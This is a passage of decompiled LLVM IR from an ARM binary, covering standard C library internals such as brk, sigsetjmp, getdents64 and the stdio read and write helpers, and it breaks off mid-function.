  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_19944 = add i32 %arg1, 40
  store i32 %v1_19944, i32* %r2.global-to-local, align 4
  %v1_19948 = inttoptr i32 %v1_19944 to i32*
  %v2_19948 = load i32, i32* %v1_19948, align 4
  store i32 %v2_19948, i32* %r2.global-to-local, align 4
  %v3_19948 = add i32 %arg1, 44
  %v4_19948 = inttoptr i32 %v3_19948 to i32*
  %v5_19948 = load i32, i32* %v4_19948, align 4
  store i32 %v5_19948, i32* %r3.global-to-local, align 4
  %v0_1994c = call i32 @__aeabi_read_tp()
  %v1_19950 = inttoptr i32 %v0_1994c to i32*
  %v2_19950 = load i32, i32* %v1_19950, align 4
  store i32 %v2_19950, i32* %r1.global-to-local, align 4
  %v3_19954 = mul i32 %v5_19948, 8
  store i32 %v3_19954, i32* %r3.global-to-local, align 4
  %v1_19958 = load i32, i32* %r2.global-to-local, align 4
  %v2_19958 = add i32 %v1_19958, %v0_1994c
  %v3_1995c = add i32 %v3_19954, %v2_19950
  %v4_1995c = inttoptr i32 %v3_1995c to i32*
  store i32 %v2_19958, i32* %v4_1995c, align 4
  %v0_19960 = load i32, i32* %r3.global-to-local, align 4
  %v1_19960 = load i32, i32* %r1.global-to-local, align 4
  %v2_19960 = add i32 %v1_19960, %v0_19960
  store i32 %v2_19960, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_19968 = add i32 %v2_19960, 4
  %v5_19968 = inttoptr i32 %v4_19968 to i8*
  store i8 1, i8* %v5_19968, align 1
  %v0_1996c = load i32, i32* @r4, align 4
  %v1_1996c = add i32 %v0_1996c, 20
  store i32 %v1_1996c, i32* %r1.global-to-local, align 4
  %v1_19970 = inttoptr i32 %v1_1996c to i32*
  %v2_19970 = load i32, i32* %v1_19970, align 4
  store i32 %v2_19970, i32* @r1, align 4
  %v3_19970 = add i32 %v0_1996c, 24
  %v4_19970 = inttoptr i32 %v3_19970 to i32*
  %v5_19970 = load i32, i32* %v4_19970, align 4
  store i32 %v5_19970, i32* %r2.global-to-local, align 4
  %v5_19974 = call i32 @__GI_mempcpy(i32 %v2_19958, i32 %v2_19970, i32 %v5_19970, i32 1)
  %v0_19978 = load i32, i32* @r4, align 4
  %v1_19978 = add i32 %v0_19978, 28
  store i32 %v1_19978, i32* %r3.global-to-local, align 4
  %v1_1997c = inttoptr i32 %v1_19978 to i32*
  %v2_1997c = load i32, i32* %v1_1997c, align 4
  store i32 %v2_1997c, i32* %r2.global-to-local, align 4
  %v3_1997c = add i32 %v0_19978, 24
  %v4_1997c = inttoptr i32 %v3_1997c to i32*
  %v5_1997c = load i32, i32* %v4_1997c, align 4
  store i32 %v5_1997c, i32* %r3.global-to-local, align 4
  %v2_19980 = sub i32 %v5_1997c, %v2_1997c
  store i32 %v2_19980, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_19988 = inttoptr i32 %v5_19974 to i8*
  %v4_19988 = call i32 @__GI_memset(i8* %v3_19988, i32 0, i32 %v2_19980)
  ret i32 %v4_19988

; uselistorder directives
  uselistorder i32 %v3_19954, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 7, 8, 0, 1, 3, 2, 12, 11, 10, 4, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_199d8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 11580) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_199ec = load i32, i32* @r0, align 4
  %v1_199f0 = inttoptr i32 %v0_199ec to i32*
  %v2_199f0 = load i32, i32* @r4, align 4
  store i32 %v2_199f0, i32* %v1_199f0, align 4
  %v3_199f0 = add i32 %v0_199ec, 4
  %v4_199f0 = inttoptr i32 %v3_199f0 to i32*
  %v5_199f0 = load i32, i32* @r5, align 4
  store i32 %v5_199f0, i32* %v4_199f0, align 4
  %v6_199f0 = add i32 %v0_199ec, 8
  %v7_199f0 = inttoptr i32 %v6_199f0 to i32*
  %v8_199f0 = load i32, i32* @r6, align 4
  store i32 %v8_199f0, i32* %v7_199f0, align 4
  %v9_199f0 = add i32 %v0_199ec, 12
  %v10_199f0 = inttoptr i32 %v9_199f0 to i32*
  %v11_199f0 = load i32, i32* @r7, align 4
  store i32 %v11_199f0, i32* %v10_199f0, align 4
  %v12_199f0 = add i32 %v0_199ec, 16
  %v13_199f0 = inttoptr i32 %v12_199f0 to i32*
  %v14_199f0 = load i32, i32* @r8, align 4
  store i32 %v14_199f0, i32* %v13_199f0, align 4
  %v15_199f0 = add i32 %v0_199ec, 20
  %v16_199f0 = inttoptr i32 %v15_199f0 to i32*
  %v17_199f0 = load i32, i32* @sb, align 4
  store i32 %v17_199f0, i32* %v16_199f0, align 4
  %v18_199f0 = add i32 %v0_199ec, 24
  %v19_199f0 = inttoptr i32 %v18_199f0 to i32*
  %v20_199f0 = load i32, i32* @sl, align 4
  store i32 %v20_199f0, i32* %v19_199f0, align 4
  %v21_199f0 = add i32 %v0_199ec, 28
  %v22_199f0 = inttoptr i32 %v21_199f0 to i32*
  %v23_199f0 = load i32, i32* @fp, align 4
  store i32 %v23_199f0, i32* %v22_199f0, align 4
  %v24_199f0 = add i32 %v0_199ec, 32
  %v25_199f0 = inttoptr i32 %v24_199f0 to i32*
  %v27_199f0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_199f0, i32* %v25_199f0, align 4
  %v28_199f0 = add i32 %v0_199ec, 36
  %v29_199f0 = inttoptr i32 %v28_199f0 to i32*
  %v30_199f0 = load i32, i32* @lr, align 4
  store i32 %v30_199f0, i32* %v29_199f0, align 4
  %v0_199f4 = call i32 @__sigjmp_save()
  ret i32 %v0_199f4

; uselistorder directives
  uselistorder i32 %v0_199ec, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 97, 98, 5, 6, 7, 8, 9, 10, 11, 12, 84, 85, 86, 87, 88, 90, 89, 91, 3, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 32, 33, 28, 29, 30, 31, 4, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0, 50, 51, 52, 53, 54, 55, 56, 1, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 92, 93, 94, 2, 95, 96 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_199fc = load i32, i32* @r5, align 4
  %v12_199fc = load i32, i32* @r7, align 4
  %v1_19a00 = add i32 %arg3, 14
  %v2_19a08 = ptrtoint i32* %stack_var_-72 to i32
  %v1_19a0c = and i32 %v1_19a00, -8
  %v2_19a10 = sub i32 %v2_19a08, %v1_19a0c
  %v1_19a14 = add i32 %v2_19a10, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_19a58, label %dec_label_pc_19a3c

dec_label_pc_19a3c:                               ; preds = %entry
  %v1_19a40 = sub i32 0, %arg1
  %v3_19a44 = load i16, i16* @global_var_244d0.762, align 2
  %v4_19a44 = sext i16 %v3_19a44 to i32
  %v0_19a48 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_19a50 = add i32 %v4_19a44, %v0_19a48
  %v4_19a50 = inttoptr i32 %v3_19a50 to i32*
  store i32 %v1_19a40, i32* %v4_19a50, align 4
  br label %dec_label_pc_19b28

dec_label_pc_19a58:                               ; preds = %entry
  br i1 false, label %dec_label_pc_19b28, label %dec_label_pc_19a60

dec_label_pc_19a60:                               ; preds = %dec_label_pc_19a58
  %v2_19a60 = add i32 %v1_19a14, %arg1
  store i32 %v2_19a60, i32* %r1.global-to-local, align 4
  %v2_19a64 = add i32 %tmp, %arg3
  store i32 %v1_19a14, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_19b10

dec_label_pc_19a80:                               ; preds = %dec_label_pc_19b10
  %v1_19a80 = add i32 %v0_19ae0, 16
  %v2_19a80 = inttoptr i32 %v1_19a80 to i16*
  %v3_19a80 = load i16, i16* %v2_19a80, align 2
  %v4_19a80 = zext i16 %v3_19a80 to i32
  %v1_19a84 = add nsw i32 %v4_19a80, -19
  store i32 %v1_19a84, i32* @r2, align 4
  %v1_19a88 = add nuw nsw i32 %v4_19a80, 7
  %v1_19a8c = and i32 %v1_19a88, 131064
  store i32 %v1_19a8c, i32* @ip, align 4
  %v2_19a94 = add i32 %v1_19a8c, %v0_19ae8
  store i32 %v2_19a94, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_19a94, %v2_19a64
  br i1 %tmp24, label %dec_label_pc_19aa0, label %dec_label_pc_19adc

dec_label_pc_19aa0:                               ; preds = %dec_label_pc_19a80
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19aa8 = load i32, i32* %r8.global-to-local, align 4
  %v0_19aac = load i32, i32* %sb.global-to-local, align 4
  %v1_19ab0 = load i32, i32* @sp, align 4
  %v2_19ab0 = inttoptr i32 %v1_19ab0 to i32*
  store i32 0, i32* %v2_19ab0, align 4
  %v4_19ab4 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_19aa8, i32 %v0_19aac)
  %v0_19ab8 = load i32, i32* @r5, align 4
  %v1_19ab8 = load i32, i32* %sl.global-to-local, align 4
  %v9_19ab8 = icmp eq i32 %v0_19ab8, %v1_19ab8
  br i1 %v9_19ab8, label %dec_label_pc_19ac0, label %dec_label_pc_19b24

dec_label_pc_19ac0:                               ; preds = %dec_label_pc_19aa0
  %v0_19ac4 = call i32 @__aeabi_read_tp()
  %v3_19ac8 = load i16, i16* @global_var_244d0.762, align 2
  %v4_19ac8 = sext i16 %v3_19ac8 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_19ad4 = add i32 %v4_19ac8, %v0_19ac4
  %v4_19ad4 = inttoptr i32 %v3_19ad4 to i32*
  store i32 22, i32* %v4_19ad4, align 4
  br label %dec_label_pc_19b28

dec_label_pc_19adc:                               ; preds = %dec_label_pc_19a80
  %v1_19adc = inttoptr i32 %v0_19ae0 to i32*
  %v2_19adc = load i32, i32* %v1_19adc, align 4
  %v3_19adc = add i32 %v0_19ae0, 4
  %v4_19adc = inttoptr i32 %v3_19adc to i32*
  %v5_19adc = load i32, i32* %v4_19adc, align 4
  store i32 %v5_19adc, i32* @r4, align 4
  %v1_19ae0 = add i32 %v0_19ae0, 8
  store i32 %v1_19ae0, i32* %r8.global-to-local, align 4
  %v1_19ae4 = inttoptr i32 %v1_19ae0 to i32*
  %v2_19ae4 = load i32, i32* %v1_19ae4, align 4
  store i32 %v2_19ae4, i32* %r8.global-to-local, align 4
  %v3_19ae4 = add i32 %v0_19ae0, 12
  %v4_19ae4 = inttoptr i32 %v3_19ae4 to i32*
  %v5_19ae4 = load i32, i32* %v4_19ae4, align 4
  store i32 %v5_19ae4, i32* %sb.global-to-local, align 4
  %v1_19ae8 = inttoptr i32 %v0_19ae8 to i32*
  store i32 %v2_19adc, i32* %v1_19ae8, align 4
  %v3_19ae8 = add i32 %v0_19ae8, 4
  %v4_19ae8 = inttoptr i32 %v3_19ae8 to i32*
  %v5_19ae8 = load i32, i32* @r4, align 4
  store i32 %v5_19ae8, i32* %v4_19ae8, align 4
  %v0_19aec = load i32, i32* %r8.global-to-local, align 4
  %v1_19aec = load i32, i32* @r5, align 4
  %v2_19aec = add i32 %v1_19aec, 8
  %v3_19aec = inttoptr i32 %v2_19aec to i32*
  store i32 %v0_19aec, i32* %v3_19aec, align 4
  %v0_19af0 = load i32, i32* %sb.global-to-local, align 4
  %v1_19af0 = load i32, i32* @r5, align 4
  %v2_19af0 = add i32 %v1_19af0, 12
  %v3_19af0 = inttoptr i32 %v2_19af0 to i32*
  store i32 %v0_19af0, i32* %v3_19af0, align 4
  %v0_19af4 = load i32, i32* @ip, align 4
  %v1_19af4 = trunc i32 %v0_19af4 to i16
  %v2_19af4 = load i32, i32* @r5, align 4
  %v3_19af4 = add i32 %v2_19af4, 16
  %v4_19af4 = inttoptr i32 %v3_19af4 to i16*
  store i16 %v1_19af4, i16* %v4_19af4, align 2
  %v0_19af8 = load i32, i32* @r7, align 4
  %v1_19af8 = add i32 %v0_19af8, 18
  %v2_19af8 = inttoptr i32 %v1_19af8 to i8*
  %v3_19af8 = load i8, i8* %v2_19af8, align 1
  %v4_19af8 = zext i8 %v3_19af8 to i32
  store i32 %v4_19af8, i32* @r3, align 4
  %v2_19afc = load i32, i32* @r5, align 4
  %v3_19afc = add i32 %v2_19afc, 18
  %v4_19afc = inttoptr i32 %v3_19afc to i8*
  store i8 %v3_19af8, i8* %v4_19afc, align 1
  %v0_19b00 = call i32 @memcpy()
  %v0_19b04 = load i32, i32* @r7, align 4
  %v1_19b04 = add i32 %v0_19b04, 16
  %v2_19b04 = inttoptr i32 %v1_19b04 to i16*
  %v3_19b04 = load i16, i16* %v2_19b04, align 2
  %v4_19b04 = zext i16 %v3_19b04 to i32
  %v0_19b08 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19b08, i32* @r5, align 4
  %v2_19b0c = add i32 %v4_19b04, %v0_19b04
  store i32 %v2_19b0c, i32* @r7, align 4
  br label %dec_label_pc_19b10

dec_label_pc_19b10:                               ; preds = %dec_label_pc_19a60, %dec_label_pc_19adc
  %v0_19ae8 = phi i32 [ %tmp, %dec_label_pc_19a60 ], [ %v0_19b08, %dec_label_pc_19adc ]
  %v0_19ae0 = phi i32 [ %v1_19a14, %dec_label_pc_19a60 ], [ %v2_19b0c, %dec_label_pc_19adc ]
  %v3_19b14 = icmp ult i32 %v0_19ae0, %v2_19a60
  %v1_19b18 = add i32 %v0_19ae8, 19
  store i32 %v1_19b18, i32* @r0, align 4
  %v1_19b1c = add i32 %v0_19ae0, 19
  store i32 %v1_19b1c, i32* @r1, align 4
  br i1 %v3_19b14, label %dec_label_pc_19a80, label %dec_label_pc_19b24.loopexit

dec_label_pc_19b24.loopexit:                      ; preds = %dec_label_pc_19b10
  %v0_19b24.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_19b24

dec_label_pc_19b24:                               ; preds = %dec_label_pc_19b24.loopexit, %dec_label_pc_19aa0
  %v1_19b24 = phi i32 [ %v0_19ae8, %dec_label_pc_19b24.loopexit ], [ %v0_19ab8, %dec_label_pc_19aa0 ]
  %v0_19b24 = phi i32 [ %v0_19b24.pre, %dec_label_pc_19b24.loopexit ], [ %v1_19ab8, %dec_label_pc_19aa0 ]
  %v2_19b24 = sub i32 %v1_19b24, %v0_19b24
  store i32 %v2_19b24, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19b28

dec_label_pc_19b28:                               ; preds = %dec_label_pc_19a58, %dec_label_pc_19ac0, %dec_label_pc_19a3c, %dec_label_pc_19b24
  %v0_19b28 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_199fc, i32* @r5, align 4
  store i32 %v12_199fc, i32* @r7, align 4
  ret i32 %v0_19b28

; uselistorder directives
  uselistorder i32 %v0_19ae0, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_19ae8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_19a14, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 3, 4, 0, 1, 5, 6, 7, 2, 8 }
  uselistorder i32 18, { 5, 6, 2, 7, 4, 8, 3, 9, 0, 10, 1, 11 }
  uselistorder i32 22, { 1, 0, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @sp, { 4, 5, 1, 6, 0, 7, 2, 8, 3 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 39, 28, 29, 30, 31, 32, 40, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 4, 3, 2, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_19b28, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_19b10, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19b40 = load i32, i32* @r4, align 4
  store i32 %v3_19b40, i32* %stack_var_-12, align 4
  %v0_19b44 = load i32, i32* %r0.global-to-local, align 4
  %v1_19b44 = inttoptr i32 %v0_19b44 to i16*
  %v2_19b44 = load i16, i16* %v1_19b44, align 2
  %v3_19b44 = zext i16 %v2_19b44 to i32
  store i32 %v3_19b44, i32* @r3, align 4
  %v1_19b48 = and i32 %v3_19b44, 4
  store i32 %v1_19b48, i32* @r5, align 4
  %v2_19b48 = icmp eq i32 %v1_19b48, 0
  store i32 %v0_19b44, i32* @r4, align 4
  br i1 %v2_19b48, label %dec_label_pc_19b5c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_19b5c:                               ; preds = %entry
  %v1_19b5c = icmp slt i32 %arg2, 0
  br i1 %v1_19b5c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_19b5c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_19b5c, %bb18
  %v1_19b64 = add i32 %v0_19b44, 4
  %v2_19b64 = inttoptr i32 %v1_19b64 to i32*
  %v3_19b64 = load i32, i32* %v2_19b64, align 4
  store i32 %v3_19b64, i32* %r0.global-to-local, align 4
  %v1_19b68 = call i32 @__libc_read(i32 %v3_19b64)
  store i32 %v1_19b68, i32* %r0.global-to-local, align 4
  %v5_19b70 = icmp sgt i32 %v1_19b68, 0
  br i1 %v5_19b70, label %.thread7, label %dec_label_pc_19b74

dec_label_pc_19b74:                               ; preds = %bb19
  %v2_19b6c = icmp eq i32 %v1_19b68, 0
  %v0_19b74 = load i32, i32* @r4, align 4
  %v1_19b74 = inttoptr i32 %v0_19b74 to i16*
  %v2_19b74 = load i16, i16* %v1_19b74, align 2
  br i1 %v2_19b6c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_19b74
  %v2_19b78 = or i16 %v2_19b74, 4
  store i16 %v2_19b78, i16* %v1_19b74, align 2
  %v1_19b94.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_19b74
  %v2_19b7c = or i16 %v2_19b74, 8
  store i16 %v2_19b7c, i16* %v1_19b74, align 2
  %v1_19b88 = load i32, i32* @r5, align 4
  store i32 %v1_19b88, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_19b94 = phi i32 [ %v1_19b94.pre, %bb20 ], [ 0, %bb ], [ %v1_19b68, %bb19 ], [ %v1_19b88, %bb21 ]
  %v2_19b90 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19b90, i32* @r4, align 4
  ret i32 %v1_19b94

; uselistorder directives
  uselistorder i16 %v2_19b74, { 1, 0 }
  uselistorder i32 %v1_19b68, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_19c5c2 = icmp eq i32 %arg3, 0
  store i1 %v2_19c5c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c5c2, label %dec_label_pc_19c64, label %dec_label_pc_19bb4

dec_label_pc_19bb4:                               ; preds = %entry, %dec_label_pc_19c5cthread-pre-split.dec_label_pc_19bb4_crit_edge
  %v0_19bc0 = phi i32 [ %v0_19bc0.pre, %dec_label_pc_19c5cthread-pre-split.dec_label_pc_19bb4_crit_edge ], [ %tmp, %entry ]
  %v0_19bbc = phi i32 [ %v5_19bcc, %dec_label_pc_19c5cthread-pre-split.dec_label_pc_19bb4_crit_edge ], [ %arg2, %entry ]
  %v3_19bb4 = phi i32 [ %v3_19bb4.pre, %dec_label_pc_19c5cthread-pre-split.dec_label_pc_19bb4_crit_edge ], [ 2147483647, %entry ]
  %v0_19bb8.in = phi i32 [ %v5_19bd0, %dec_label_pc_19c5cthread-pre-split.dec_label_pc_19bb4_crit_edge ], [ %arg3, %entry ]
  %v3_19bb8 = phi i32 [ %v5_19bd0, %dec_label_pc_19c5cthread-pre-split.dec_label_pc_19bb4_crit_edge ], [ %arg3, %entry ]
  %v0_19bb8 = icmp slt i32 %v0_19bb8.in, 0
  %storemerge = select i1 %v0_19bb8, i32 %v3_19bb4, i32 %v3_19bb8
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_19bbc, i32* %r1.global-to-local, align 4
  %v1_19bc0 = add i32 %v0_19bc0, 4
  %v2_19bc0 = inttoptr i32 %v1_19bc0 to i32*
  %v3_19bc0 = load i32, i32* %v2_19bc0, align 4
  %v3_19bc4 = call i32 @__GI___libc_write(i32 %v3_19bc0, i32 %v0_19bbc)
  %v1_19bc8 = icmp slt i32 %v3_19bc4, 0
  %v2_19bc8 = icmp eq i32 %v3_19bc4, 0
  store i1 %v2_19bc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19bc8, label %dec_label_pc_19bd8, label %dec_label_pc_19c5cthread-pre-split

dec_label_pc_19bd8:                               ; preds = %dec_label_pc_19bb4
  %v0_19bd8 = load i32, i32* @r4, align 4
  %v1_19bd8 = inttoptr i32 %v0_19bd8 to i16*
  %v2_19bd8 = load i16, i16* %v1_19bd8, align 2
  %v1_19bdc = or i16 %v2_19bd8, 8
  store i16 %v1_19bdc, i16* %v1_19bd8, align 2
  store i32 43228, i32* %r3.global-to-local, align 4
  %v0_19be8 = call i32 @__aeabi_read_tp()
  %v3_19bec = load i16, i16* @global_var_244d0.762, align 2
  %v4_19bec = sext i16 %v3_19bec to i32
  store i32 %v4_19bec, i32* %r3.global-to-local, align 4
  %v2_19bf0 = add i32 %v4_19bec, %v0_19be8
  %v3_19bf0 = inttoptr i32 %v2_19bf0 to i32*
  %v4_19bf0 = load i32, i32* %v3_19bf0, align 4
  store i32 %v4_19bf0, i32* %r3.global-to-local, align 4
  %v7_19bf4 = icmp eq i32 %v4_19bf0, 4
  store i1 %v7_19bf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19bf4, label %dec_label_pc_19c00, label %bb21

bb21:                                             ; preds = %dec_label_pc_19bd8
  %v8_19bf8 = icmp eq i32 %v4_19bf0, 11
  store i1 %v8_19bf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_19bf8, label %dec_label_pc_19c00, label %dec_label_pc_19c64

dec_label_pc_19c00:                               ; preds = %dec_label_pc_19bd8, %bb21
  %v0_19c00 = load i32, i32* @r4, align 4
  %v1_19c00 = add i32 %v0_19c00, 8
  store i32 %v1_19c00, i32* %r2.global-to-local, align 4
  %v1_19c04 = inttoptr i32 %v1_19c00 to i32*
  %v2_19c04 = load i32, i32* %v1_19c04, align 4
  store i32 %v2_19c04, i32* %r2.global-to-local, align 4
  %v3_19c04 = add i32 %v0_19c00, 12
  %v4_19c04 = inttoptr i32 %v3_19c04 to i32*
  %v5_19c04 = load i32, i32* %v4_19c04, align 4
  store i32 %v5_19c04, i32* %r3.global-to-local, align 4
  %v2_19c08 = sub i32 %v5_19c04, %v2_19c04
  store i32 %v2_19c08, i32* %r1.global-to-local, align 4
  %v9_19c08 = icmp eq i32 %v5_19c04, %v2_19c04
  store i1 %v9_19c08, i1* %cpsr_z.global-to-local, align 1
  %v0_19c54.pre = load i32, i32* @r5, align 4
  br i1 %v9_19c08, label %dec_label_pc_19c54, label %dec_label_pc_19c10

dec_label_pc_19c10:                               ; preds = %dec_label_pc_19c00
  %v3_19c10 = icmp ult i32 %v2_19c08, %v0_19c54.pre
  %v9_19c10 = icmp eq i32 %v2_19c08, %v0_19c54.pre
  store i1 %v9_19c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19c10, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_19c10
  store i32 %v0_19c54.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_19c10, %bb22, %dec_label_pc_19c38
  %v2_19c24 = phi i32 [ %v1_19c3c, %dec_label_pc_19c38 ], [ %v2_19c04, %bb22 ], [ %v2_19c04, %dec_label_pc_19c10 ]
  %v0_19c18 = load i32, i32* @r6, align 4
  %v1_19c18 = inttoptr i32 %v0_19c18 to i8*
  %v2_19c18 = load i8, i8* %v1_19c18, align 1
  %v3_19c18 = zext i8 %v2_19c18 to i32
  store i32 %v3_19c18, i32* %r3.global-to-local, align 4
  %v7_19c1c = icmp eq i8 %v2_19c18, 10
  store i1 %v7_19c1c, i1* %cpsr_z.global-to-local, align 1
  %v1_19c20 = add i32 %v0_19c18, 1
  store i32 %v1_19c20, i32* @r6, align 4
  %v3_19c24 = inttoptr i32 %v2_19c24 to i8*
  store i8 %v2_19c18, i8* %v3_19c24, align 1
  %v0_19c28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19c28, label %dec_label_pc_19c2c, label %dec_label_pc_19c38

dec_label_pc_19c2c:                               ; preds = %.preheader
  %v0_19c2c = load i32, i32* @r4, align 4
  %v1_19c2c = inttoptr i32 %v0_19c2c to i16*
  %v2_19c2c = load i16, i16* %v1_19c2c, align 2
  %v3_19c2c = zext i16 %v2_19c2c to i32
  store i32 %v3_19c2c, i32* %r3.global-to-local, align 4
  %v1_19c30 = and i32 %v3_19c2c, 256
  %v2_19c30 = icmp eq i32 %v1_19c30, 0
  store i1 %v2_19c30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c30, label %dec_label_pc_19c38, label %dec_label_pc_19c2c.dec_label_pc_19c44_crit_edge

dec_label_pc_19c2c.dec_label_pc_19c44_crit_edge:  ; preds = %dec_label_pc_19c2c
  %v0_19c48.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19c44

dec_label_pc_19c38:                               ; preds = %dec_label_pc_19c2c, %.preheader
  %v0_19c38 = load i32, i32* %r1.global-to-local, align 4
  %v1_19c38 = add i32 %v0_19c38, -1
  store i32 %v1_19c38, i32* %r1.global-to-local, align 4
  %v7_19c38 = icmp eq i32 %v0_19c38, 1
  store i1 %v7_19c38, i1* %cpsr_z.global-to-local, align 1
  %v0_19c3c = load i32, i32* %r2.global-to-local, align 4
  %v1_19c3c = add i32 %v0_19c3c, 1
  store i32 %v1_19c3c, i32* %r2.global-to-local, align 4
  br i1 %v7_19c38, label %dec_label_pc_19c38.dec_label_pc_19c44_crit_edge, label %.preheader

dec_label_pc_19c38.dec_label_pc_19c44_crit_edge:  ; preds = %dec_label_pc_19c38
  %v0_19c44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19c44

dec_label_pc_19c44:                               ; preds = %dec_label_pc_19c2c.dec_label_pc_19c44_crit_edge, %dec_label_pc_19c38.dec_label_pc_19c44_crit_edge
  %v0_19c48 = phi i32 [ %v1_19c3c, %dec_label_pc_19c38.dec_label_pc_19c44_crit_edge ], [ %v0_19c48.pre, %dec_label_pc_19c2c.dec_label_pc_19c44_crit_edge ]
  %v0_19c44 = phi i32 [ %v0_19c44.pre, %dec_label_pc_19c38.dec_label_pc_19c44_crit_edge ], [ %v0_19c2c, %dec_label_pc_19c2c.dec_label_pc_19c44_crit_edge ]
  %v1_19c44 = add i32 %v0_19c44, 8
  %v2_19c44 = inttoptr i32 %v1_19c44 to i32*
  %v3_19c44 = load i32, i32* %v2_19c44, align 4
